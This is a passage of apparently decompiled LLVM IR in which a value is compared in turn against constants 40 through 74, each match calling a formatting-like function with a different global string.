  %v2_b6f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b704 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b710 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b71c = sext i8 %v3_b704 to i32
  %v6_b71c = sext i8 %v3_b710 to i32
  %v8_b71c = call i32 @function_92f8(i32 %v2_b6f8, i32 ptrtoint ([13 x i8]* @global_var_21558.135 to i32), i32 %v4_b71c, i32 %v6_b71c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b720

dec_label_pc_b720:                                ; preds = %dec_label_pc_b6ec, %dec_label_pc_b6f8
  %v7_b724 = icmp eq i32 %v2_aef8, 40
  br i1 %v7_b724, label %dec_label_pc_b72c, label %dec_label_pc_b754

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b720
  %v2_b72c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b738 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b744 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b750 = sext i8 %v3_b738 to i32
  %v6_b750 = sext i8 %v3_b744 to i32
  %v8_b750 = call i32 @function_92f8(i32 %v2_b72c, i32 ptrtoint ([14 x i8]* @global_var_21568.137 to i32), i32 %v4_b750, i32 %v6_b750, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b754

dec_label_pc_b754:                                ; preds = %dec_label_pc_b720, %dec_label_pc_b72c
  %v7_b758 = icmp eq i32 %v2_aef8, 41
  br i1 %v7_b758, label %dec_label_pc_b760, label %dec_label_pc_b788

dec_label_pc_b760:                                ; preds = %dec_label_pc_b754
  %v2_b760 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b76c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b778 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b784 = sext i8 %v3_b76c to i32
  %v6_b784 = sext i8 %v3_b778 to i32
  %v8_b784 = call i32 @function_92f8(i32 %v2_b760, i32 ptrtoint ([13 x i8]* @global_var_21578.139 to i32), i32 %v4_b784, i32 %v6_b784, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b788

dec_label_pc_b788:                                ; preds = %dec_label_pc_b754, %dec_label_pc_b760
  %v7_b78c = icmp eq i32 %v2_aef8, 42
  br i1 %v7_b78c, label %dec_label_pc_b794, label %dec_label_pc_b7bc

dec_label_pc_b794:                                ; preds = %dec_label_pc_b788
  %v2_b794 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7a0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b7ac = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b7b8 = sext i8 %v3_b7a0 to i32
  %v6_b7b8 = sext i8 %v3_b7ac to i32
  %v8_b7b8 = call i32 @function_92f8(i32 %v2_b794, i32 ptrtoint ([13 x i8]* @global_var_21588.141 to i32), i32 %v4_b7b8, i32 %v6_b7b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7bc

dec_label_pc_b7bc:                                ; preds = %dec_label_pc_b788, %dec_label_pc_b794
  %v7_b7c0 = icmp eq i32 %v2_aef8, 43
  br i1 %v7_b7c0, label %dec_label_pc_b7c8, label %dec_label_pc_b7f0

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b7bc
  %v2_b7c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7d4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b7e0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b7ec = sext i8 %v3_b7d4 to i32
  %v6_b7ec = sext i8 %v3_b7e0 to i32
  %v8_b7ec = call i32 @function_92f8(i32 %v2_b7c8, i32 ptrtoint ([13 x i8]* @global_var_21598.143 to i32), i32 %v4_b7ec, i32 %v6_b7ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f0

dec_label_pc_b7f0:                                ; preds = %dec_label_pc_b7bc, %dec_label_pc_b7c8
  %v7_b7f4 = icmp eq i32 %v2_aef8, 44
  br i1 %v7_b7f4, label %dec_label_pc_b7fc, label %dec_label_pc_b824

dec_label_pc_b7fc:                                ; preds = %dec_label_pc_b7f0
  %v2_b7fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b808 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b814 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b820 = sext i8 %v3_b808 to i32
  %v6_b820 = sext i8 %v3_b814 to i32
  %v8_b820 = call i32 @function_92f8(i32 %v2_b7fc, i32 ptrtoint ([13 x i8]* @global_var_215a8.145 to i32), i32 %v4_b820, i32 %v6_b820, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b824

dec_label_pc_b824:                                ; preds = %dec_label_pc_b7f0, %dec_label_pc_b7fc
  %v7_b828 = icmp eq i32 %v2_aef8, 45
  br i1 %v7_b828, label %dec_label_pc_b830, label %dec_label_pc_b858

dec_label_pc_b830:                                ; preds = %dec_label_pc_b824
  %v2_b830 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b83c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b848 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b854 = sext i8 %v3_b83c to i32
  %v6_b854 = sext i8 %v3_b848 to i32
  %v8_b854 = call i32 @function_92f8(i32 %v2_b830, i32 ptrtoint ([13 x i8]* @global_var_215b8.147 to i32), i32 %v4_b854, i32 %v6_b854, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b824, %dec_label_pc_b830
  %v7_b85c = icmp eq i32 %v2_aef8, 46
  br i1 %v7_b85c, label %dec_label_pc_b864, label %dec_label_pc_b88c

dec_label_pc_b864:                                ; preds = %dec_label_pc_b858
  %v2_b864 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b870 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b87c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b888 = sext i8 %v3_b870 to i32
  %v6_b888 = sext i8 %v3_b87c to i32
  %v8_b888 = call i32 @function_92f8(i32 %v2_b864, i32 ptrtoint ([13 x i8]* @global_var_215c8.149 to i32), i32 %v4_b888, i32 %v6_b888, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b88c

dec_label_pc_b88c:                                ; preds = %dec_label_pc_b858, %dec_label_pc_b864
  %v7_b890 = icmp eq i32 %v2_aef8, 47
  br i1 %v7_b890, label %dec_label_pc_b898, label %dec_label_pc_b8c0

dec_label_pc_b898:                                ; preds = %dec_label_pc_b88c
  %v2_b898 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8a4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b8b0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b8bc = sext i8 %v3_b8a4 to i32
  %v6_b8bc = sext i8 %v3_b8b0 to i32
  %v8_b8bc = call i32 @function_92f8(i32 %v2_b898, i32 ptrtoint ([14 x i8]* @global_var_215d8.151 to i32), i32 %v4_b8bc, i32 %v6_b8bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c0

dec_label_pc_b8c0:                                ; preds = %dec_label_pc_b88c, %dec_label_pc_b898
  %v7_b8c4 = icmp eq i32 %v2_aef8, 48
  br i1 %v7_b8c4, label %dec_label_pc_b8cc, label %dec_label_pc_b8f4

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b8c0
  %v2_b8cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8d8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b8e4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b8f0 = sext i8 %v3_b8d8 to i32
  %v6_b8f0 = sext i8 %v3_b8e4 to i32
  %v8_b8f0 = call i32 @function_92f8(i32 %v2_b8cc, i32 ptrtoint ([13 x i8]* @global_var_215e8.153 to i32), i32 %v4_b8f0, i32 %v6_b8f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8f4

dec_label_pc_b8f4:                                ; preds = %dec_label_pc_b8c0, %dec_label_pc_b8cc
  %v7_b8f8 = icmp eq i32 %v2_aef8, 49
  br i1 %v7_b8f8, label %dec_label_pc_b900, label %dec_label_pc_b928

dec_label_pc_b900:                                ; preds = %dec_label_pc_b8f4
  %v2_b900 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b90c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b918 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b924 = sext i8 %v3_b90c to i32
  %v6_b924 = sext i8 %v3_b918 to i32
  %v8_b924 = call i32 @function_92f8(i32 %v2_b900, i32 ptrtoint ([14 x i8]* @global_var_215f8.155 to i32), i32 %v4_b924, i32 %v6_b924, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b928

dec_label_pc_b928:                                ; preds = %dec_label_pc_b8f4, %dec_label_pc_b900
  %v7_b92c = icmp eq i32 %v2_aef8, 50
  br i1 %v7_b92c, label %dec_label_pc_b934, label %dec_label_pc_b95c

dec_label_pc_b934:                                ; preds = %dec_label_pc_b928
  %v2_b934 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b940 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b94c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b958 = sext i8 %v3_b940 to i32
  %v6_b958 = sext i8 %v3_b94c to i32
  %v8_b958 = call i32 @function_92f8(i32 %v2_b934, i32 ptrtoint ([14 x i8]* @global_var_21608.157 to i32), i32 %v4_b958, i32 %v6_b958, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b928, %dec_label_pc_b934
  %v7_b960 = icmp eq i32 %v2_aef8, 51
  br i1 %v7_b960, label %dec_label_pc_b968, label %dec_label_pc_b990

dec_label_pc_b968:                                ; preds = %dec_label_pc_b95c
  %v2_b968 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b974 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b980 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b98c = sext i8 %v3_b974 to i32
  %v6_b98c = sext i8 %v3_b980 to i32
  %v8_b98c = call i32 @function_92f8(i32 %v2_b968, i32 ptrtoint ([14 x i8]* @global_var_21618.159 to i32), i32 %v4_b98c, i32 %v6_b98c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_b968
  %v7_b994 = icmp eq i32 %v2_aef8, 52
  br i1 %v7_b994, label %dec_label_pc_b99c, label %dec_label_pc_b9c4

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b990
  %v2_b99c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9a8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b9b4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b9c0 = sext i8 %v3_b9a8 to i32
  %v6_b9c0 = sext i8 %v3_b9b4 to i32
  %v8_b9c0 = call i32 @function_92f8(i32 %v2_b99c, i32 ptrtoint ([14 x i8]* @global_var_21628.161 to i32), i32 %v4_b9c0, i32 %v6_b9c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9c4

dec_label_pc_b9c4:                                ; preds = %dec_label_pc_b990, %dec_label_pc_b99c
  %v7_b9c8 = icmp eq i32 %v2_aef8, 53
  br i1 %v7_b9c8, label %dec_label_pc_b9d0, label %dec_label_pc_b9f8

dec_label_pc_b9d0:                                ; preds = %dec_label_pc_b9c4
  %v2_b9d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9dc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b9e8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b9f4 = sext i8 %v3_b9dc to i32
  %v6_b9f4 = sext i8 %v3_b9e8 to i32
  %v8_b9f4 = call i32 @function_92f8(i32 %v2_b9d0, i32 ptrtoint ([13 x i8]* @global_var_21638.163 to i32), i32 %v4_b9f4, i32 %v6_b9f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9f8

dec_label_pc_b9f8:                                ; preds = %dec_label_pc_b9c4, %dec_label_pc_b9d0
  %v7_b9fc = icmp eq i32 %v2_aef8, 54
  br i1 %v7_b9fc, label %dec_label_pc_ba04, label %dec_label_pc_ba2c

dec_label_pc_ba04:                                ; preds = %dec_label_pc_b9f8
  %v2_ba04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba10 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ba1c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ba28 = sext i8 %v3_ba10 to i32
  %v6_ba28 = sext i8 %v3_ba1c to i32
  %v8_ba28 = call i32 @function_92f8(i32 %v2_ba04, i32 ptrtoint ([14 x i8]* @global_var_21648.165 to i32), i32 %v4_ba28, i32 %v6_ba28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba2c

dec_label_pc_ba2c:                                ; preds = %dec_label_pc_b9f8, %dec_label_pc_ba04
  %v7_ba30 = icmp eq i32 %v2_aef8, 55
  br i1 %v7_ba30, label %dec_label_pc_ba38, label %dec_label_pc_ba60

dec_label_pc_ba38:                                ; preds = %dec_label_pc_ba2c
  %v2_ba38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba44 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ba50 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ba5c = sext i8 %v3_ba44 to i32
  %v6_ba5c = sext i8 %v3_ba50 to i32
  %v8_ba5c = call i32 @function_92f8(i32 %v2_ba38, i32 ptrtoint ([14 x i8]* @global_var_21658.167 to i32), i32 %v4_ba5c, i32 %v6_ba5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba60

dec_label_pc_ba60:                                ; preds = %dec_label_pc_ba2c, %dec_label_pc_ba38
  %v7_ba64 = icmp eq i32 %v2_aef8, 56
  br i1 %v7_ba64, label %dec_label_pc_ba6c, label %dec_label_pc_ba94

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_ba60
  %v2_ba6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba78 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ba84 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ba90 = sext i8 %v3_ba78 to i32
  %v6_ba90 = sext i8 %v3_ba84 to i32
  %v8_ba90 = call i32 @function_92f8(i32 %v2_ba6c, i32 ptrtoint ([14 x i8]* @global_var_21668.169 to i32), i32 %v4_ba90, i32 %v6_ba90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba94

dec_label_pc_ba94:                                ; preds = %dec_label_pc_ba60, %dec_label_pc_ba6c
  %v7_ba98 = icmp eq i32 %v2_aef8, 57
  br i1 %v7_ba98, label %dec_label_pc_baa0, label %dec_label_pc_bac8

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba94
  %v2_baa0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_baac = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bab8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bac4 = sext i8 %v3_baac to i32
  %v6_bac4 = sext i8 %v3_bab8 to i32
  %v8_bac4 = call i32 @function_92f8(i32 %v2_baa0, i32 ptrtoint ([14 x i8]* @global_var_21678.171 to i32), i32 %v4_bac4, i32 %v6_bac4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bac8

dec_label_pc_bac8:                                ; preds = %dec_label_pc_ba94, %dec_label_pc_baa0
  %v7_bacc = icmp eq i32 %v2_aef8, 58
  br i1 %v7_bacc, label %dec_label_pc_bad4, label %dec_label_pc_bafc

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bac8
  %v2_bad4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bae0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_baec = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_baf8 = sext i8 %v3_bae0 to i32
  %v6_baf8 = sext i8 %v3_baec to i32
  %v8_baf8 = call i32 @function_92f8(i32 %v2_bad4, i32 ptrtoint ([14 x i8]* @global_var_21688.173 to i32), i32 %v4_baf8, i32 %v6_baf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bac8, %dec_label_pc_bad4
  %v7_bb00 = icmp eq i32 %v2_aef8, 59
  br i1 %v7_bb00, label %dec_label_pc_bb08, label %dec_label_pc_bb30

dec_label_pc_bb08:                                ; preds = %dec_label_pc_bafc
  %v2_bb08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb14 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bb20 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bb2c = sext i8 %v3_bb14 to i32
  %v6_bb2c = sext i8 %v3_bb20 to i32
  %v8_bb2c = call i32 @function_92f8(i32 %v2_bb08, i32 ptrtoint ([14 x i8]* @global_var_21698.175 to i32), i32 %v4_bb2c, i32 %v6_bb2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb30

dec_label_pc_bb30:                                ; preds = %dec_label_pc_bafc, %dec_label_pc_bb08
  %v7_bb34 = icmp eq i32 %v2_aef8, 60
  br i1 %v7_bb34, label %dec_label_pc_bb3c, label %dec_label_pc_bb64

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb30
  %v2_bb3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb48 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bb54 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bb60 = sext i8 %v3_bb48 to i32
  %v6_bb60 = sext i8 %v3_bb54 to i32
  %v8_bb60 = call i32 @function_92f8(i32 %v2_bb3c, i32 ptrtoint ([13 x i8]* @global_var_216a8.177 to i32), i32 %v4_bb60, i32 %v6_bb60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb64

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bb30, %dec_label_pc_bb3c
  %v7_bb68 = icmp eq i32 %v2_aef8, 61
  br i1 %v7_bb68, label %dec_label_pc_bb70, label %dec_label_pc_bb98

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb64
  %v2_bb70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb7c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bb88 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bb94 = sext i8 %v3_bb7c to i32
  %v6_bb94 = sext i8 %v3_bb88 to i32
  %v8_bb94 = call i32 @function_92f8(i32 %v2_bb70, i32 ptrtoint ([14 x i8]* @global_var_216b8.179 to i32), i32 %v4_bb94, i32 %v6_bb94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb98

dec_label_pc_bb98:                                ; preds = %dec_label_pc_bb64, %dec_label_pc_bb70
  %v7_bb9c = icmp eq i32 %v2_aef8, 62
  br i1 %v7_bb9c, label %dec_label_pc_bba4, label %dec_label_pc_bbcc

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb98
  %v2_bba4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbb0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bbbc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bbc8 = sext i8 %v3_bbb0 to i32
  %v6_bbc8 = sext i8 %v3_bbbc to i32
  %v8_bbc8 = call i32 @function_92f8(i32 %v2_bba4, i32 ptrtoint ([14 x i8]* @global_var_216c8.181 to i32), i32 %v4_bbc8, i32 %v6_bbc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbcc

dec_label_pc_bbcc:                                ; preds = %dec_label_pc_bb98, %dec_label_pc_bba4
  %v7_bbd0 = icmp eq i32 %v2_aef8, 63
  br i1 %v7_bbd0, label %dec_label_pc_bbd8, label %dec_label_pc_bc00

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbcc
  %v2_bbd8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbe4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bbf0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bbfc = sext i8 %v3_bbe4 to i32
  %v6_bbfc = sext i8 %v3_bbf0 to i32
  %v8_bbfc = call i32 @function_92f8(i32 %v2_bbd8, i32 ptrtoint ([14 x i8]* @global_var_216d8.183 to i32), i32 %v4_bbfc, i32 %v6_bbfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc00

dec_label_pc_bc00:                                ; preds = %dec_label_pc_bbcc, %dec_label_pc_bbd8
  %v7_bc04 = icmp eq i32 %v2_aef8, 64
  br i1 %v7_bc04, label %dec_label_pc_bc0c, label %dec_label_pc_bc34

dec_label_pc_bc0c:                                ; preds = %dec_label_pc_bc00
  %v2_bc0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc18 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bc24 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bc30 = sext i8 %v3_bc18 to i32
  %v6_bc30 = sext i8 %v3_bc24 to i32
  %v8_bc30 = call i32 @function_92f8(i32 %v2_bc0c, i32 ptrtoint ([13 x i8]* @global_var_216e8.185 to i32), i32 %v4_bc30, i32 %v6_bc30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc34

dec_label_pc_bc34:                                ; preds = %dec_label_pc_bc00, %dec_label_pc_bc0c
  %v7_bc38 = icmp eq i32 %v2_aef8, 65
  br i1 %v7_bc38, label %dec_label_pc_bc40, label %dec_label_pc_bc68

dec_label_pc_bc40:                                ; preds = %dec_label_pc_bc34
  %v2_bc40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc4c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bc58 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bc64 = sext i8 %v3_bc4c to i32
  %v6_bc64 = sext i8 %v3_bc58 to i32
  %v8_bc64 = call i32 @function_92f8(i32 %v2_bc40, i32 ptrtoint ([13 x i8]* @global_var_216f8.187 to i32), i32 %v4_bc64, i32 %v6_bc64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc34, %dec_label_pc_bc40
  %v7_bc6c = icmp eq i32 %v2_aef8, 66
  br i1 %v7_bc6c, label %dec_label_pc_bc74, label %dec_label_pc_bc9c

dec_label_pc_bc74:                                ; preds = %dec_label_pc_bc68
  %v2_bc74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc80 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bc8c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bc98 = sext i8 %v3_bc80 to i32
  %v6_bc98 = sext i8 %v3_bc8c to i32
  %v8_bc98 = call i32 @function_92f8(i32 %v2_bc74, i32 ptrtoint ([13 x i8]* @global_var_21708.189 to i32), i32 %v4_bc98, i32 %v6_bc98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc9c

dec_label_pc_bc9c:                                ; preds = %dec_label_pc_bc68, %dec_label_pc_bc74
  %v7_bca0 = icmp eq i32 %v2_aef8, 67
  br i1 %v7_bca0, label %dec_label_pc_bca8, label %dec_label_pc_bcd0

dec_label_pc_bca8:                                ; preds = %dec_label_pc_bc9c
  %v2_bca8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcb4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bcc0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bccc = sext i8 %v3_bcb4 to i32
  %v6_bccc = sext i8 %v3_bcc0 to i32
  %v8_bccc = call i32 @function_92f8(i32 %v2_bca8, i32 ptrtoint ([12 x i8]* @global_var_21718.191 to i32), i32 %v4_bccc, i32 %v6_bccc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcd0

dec_label_pc_bcd0:                                ; preds = %dec_label_pc_bc9c, %dec_label_pc_bca8
  %v7_bcd4 = icmp eq i32 %v2_aef8, 68
  br i1 %v7_bcd4, label %dec_label_pc_bcdc, label %dec_label_pc_bd04

dec_label_pc_bcdc:                                ; preds = %dec_label_pc_bcd0
  %v2_bcdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bce8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bcf4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bd00 = sext i8 %v3_bce8 to i32
  %v6_bd00 = sext i8 %v3_bcf4 to i32
  %v8_bd00 = call i32 @function_92f8(i32 %v2_bcdc, i32 ptrtoint ([13 x i8]* @global_var_21724.193 to i32), i32 %v4_bd00, i32 %v6_bd00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd04

dec_label_pc_bd04:                                ; preds = %dec_label_pc_bcd0, %dec_label_pc_bcdc
  %v7_bd08 = icmp eq i32 %v2_aef8, 69
  br i1 %v7_bd08, label %dec_label_pc_bd10, label %bb

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bd04
  %v2_bd10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd1c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bd28 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bd34 = sext i8 %v3_bd1c to i32
  %v6_bd34 = sext i8 %v3_bd28 to i32
  %v8_bd34 = call i32 @function_92f8(i32 %v2_bd10, i32 ptrtoint ([13 x i8]* @global_var_21734.195 to i32), i32 %v4_bd34, i32 %v6_bd34, i32 ptrtoint (i32* @0 to i32))
  br label %bb

bb:                                               ; preds = %dec_label_pc_bd04, %dec_label_pc_bd10
  %v7_bfa4 = icmp eq i32 %v2_aef8, 70
  br i1 %v7_bfa4, label %dec_label_pc_bfac, label %dec_label_pc_bfd4

dec_label_pc_bfac:                                ; preds = %bb
  %v2_bfac = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfb8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bfc4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_bfd0 = sext i8 %v3_bfb8 to i32
  %v6_bfd0 = sext i8 %v3_bfc4 to i32
  %v8_bfd0 = call i32 @function_92f8(i32 %v2_bfac, i32 ptrtoint ([13 x i8]* @global_var_21744.197 to i32), i32 %v4_bfd0, i32 %v6_bfd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %bb, %dec_label_pc_bfac
  %v7_bfd8 = icmp eq i32 %v2_aef8, 71
  br i1 %v7_bfd8, label %dec_label_pc_bfe0, label %dec_label_pc_c008

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfd4
  %v2_bfe0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfec = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_bff8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c004 = sext i8 %v3_bfec to i32
  %v6_c004 = sext i8 %v3_bff8 to i32
  %v8_c004 = call i32 @function_92f8(i32 %v2_bfe0, i32 ptrtoint ([13 x i8]* @global_var_21754.200 to i32), i32 %v4_c004, i32 %v6_c004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_bfd4, %dec_label_pc_bfe0
  %v7_c00c = icmp eq i32 %v2_aef8, 72
  br i1 %v7_c00c, label %dec_label_pc_c014, label %dec_label_pc_c03c

dec_label_pc_c014:                                ; preds = %dec_label_pc_c008
  %v2_c014 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c020 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c02c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c038 = sext i8 %v3_c020 to i32
  %v6_c038 = sext i8 %v3_c02c to i32
  %v8_c038 = call i32 @function_92f8(i32 %v2_c014, i32 ptrtoint ([13 x i8]* @global_var_21764.202 to i32), i32 %v4_c038, i32 %v6_c038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c03c

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c008, %dec_label_pc_c014
  %v7_c040 = icmp eq i32 %v2_aef8, 73
  br i1 %v7_c040, label %dec_label_pc_c048, label %dec_label_pc_c070

dec_label_pc_c048:                                ; preds = %dec_label_pc_c03c
  %v2_c048 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c054 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c060 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c06c = sext i8 %v3_c054 to i32
  %v6_c06c = sext i8 %v3_c060 to i32
  %v8_c06c = call i32 @function_92f8(i32 %v2_c048, i32 ptrtoint ([13 x i8]* @global_var_21774.204 to i32), i32 %v4_c06c, i32 %v6_c06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c070

dec_label_pc_c070:                                ; preds = %dec_label_pc_c03c, %dec_label_pc_c048
  %v7_c074 = icmp eq i32 %v2_aef8, 74
  br i1 %v7_c074, label %dec_label_pc_c07c, label %dec_label_pc_c0a4

dec_label_pc_c07c:                                ; preds = %dec_label_pc_c070
  %v2_c07c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c088 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_c094 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_c0a0 = sext i8 %v3_c088 to i32
  %v6_c0a0 = sext i8 %v3_c094 to i32
